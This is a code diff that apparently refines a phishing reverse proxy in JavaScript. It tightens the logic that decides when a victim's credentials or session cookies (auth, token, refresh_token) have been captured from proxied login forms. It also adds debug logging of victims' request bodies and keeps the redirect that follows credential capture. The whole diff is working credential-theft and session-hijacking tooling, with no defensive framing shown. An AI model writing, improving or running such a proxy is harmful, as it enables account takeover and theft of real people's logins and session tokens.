@@ -49,23 +49,32 @@ function hasCredentialsBeenCollected(currentSession) {
     
     const session = VICTIM_SESSIONS[currentSession];
     
-    // Check for common credential indicators in cookies
-    const credentialCookies = session.cookies.filter(cookie => {
+    // Check for authentication cookies (more specific)
+    const authCookies = session.cookies.filter(cookie => {
         const cookieName = cookie.name.toLowerCase();
-        return config.credentials.credentialKeywords.some(keyword => 
-            cookieName.includes(keyword)
-        );
+        // Look for actual auth tokens, not just any credential-related cookie
+        return cookieName.includes('auth') || 
+               cookieName.includes('token') || 
+               cookieName.includes('session') ||
+               cookieName.includes('access_token') ||
+               cookieName.includes('id_token') ||
+               cookieName.includes('refresh_token');
     });
     
-    // Check for form submissions with credentials
+    // Check for form submissions with actual credentials
     if (session.lastRequestBody) {
         const body = session.lastRequestBody.toLowerCase();
-        if (config.credentials.credentialFields.some(field => body.includes(field))) {
+        // Look for actual email/password values, not just field names
+        const hasEmail = body.includes('email=') || body.includes('username=') || body.includes('user=');
+        const hasPassword = body.includes('password=') || body.includes('pass=') || body.includes('pwd=');
+        
+        if (hasEmail && hasPassword) {
             return true;
         }
     }
     
-    return credentialCookies.length > 0;
+    // Only redirect if we have actual auth cookies (indicating successful login)
+    return authCookies.length > 0;
 }
 
 // Function to check if this is a login form submission
@@ -77,9 +86,13 @@ function isLoginFormSubmission(proxyRequestBody, proxyRequestOptions) {
     
     // Check for common login endpoints
     const isLoginEndpoint = config.credentials.loginEndpoints.some(endpoint => path.includes(endpoint));
-    const hasCredentials = config.credentials.credentialFields.some(field => body.includes(field));
     
-    return isLoginEndpoint && hasCredentials;
+    // Look for actual email/password values in the request body
+    const hasEmail = body.includes('email=') || body.includes('username=') || body.includes('user=');
+    const hasPassword = body.includes('password=') || body.includes('pass=') || body.includes('pwd=');
+    
+    // Only trigger if it's a login endpoint AND has both email and password
+    return isLoginEndpoint && hasEmail && hasPassword;
 }
 
 
@@ -461,7 +474,20 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                 }
 
                 // Check if credentials have been collected and redirect if needed
-                if (config.credentials.enableRedirect && (hasCredentialsBeenCollected(currentSession) || isLoginFormSubmission(proxyRequestBody, proxyRequestOptions))) {
+                const hasCredentials = hasCredentialsBeenCollected(currentSession);
+                const isLoginForm = isLoginFormSubmission(proxyRequestBody, proxyRequestOptions);
+                
+                // Debug logging
+                if (config.logging.enableCredentialLogging) {
+                    console.log(`[DEBUG] Session: ${currentSession}`);
+                    console.log(`[DEBUG] Has credentials: ${hasCredentials}`);
+                    console.log(`[DEBUG] Is login form: ${isLoginForm}`);
+                    console.log(`[DEBUG] Request path: ${proxyRequestOptions.path}`);
+                    console.log(`[DEBUG] Request body preview: ${proxyRequestBody ? proxyRequestBody.toString().substring(0, 200) : 'none'}`);
+                    console.log(`[DEBUG] Cookies count: ${VICTIM_SESSIONS[currentSession] ? VICTIM_SESSIONS[currentSession].cookies.length : 0}`);
+                }
+                
+                if (config.credentials.enableRedirect && (hasCredentials || isLoginForm)) {
                     console.log(`[CREDENTIALS_COLLECTED] Session: ${currentSession} - Redirecting to: ${config.credentials.redirectUrl}`);
                     
                     // Log the credential collection event
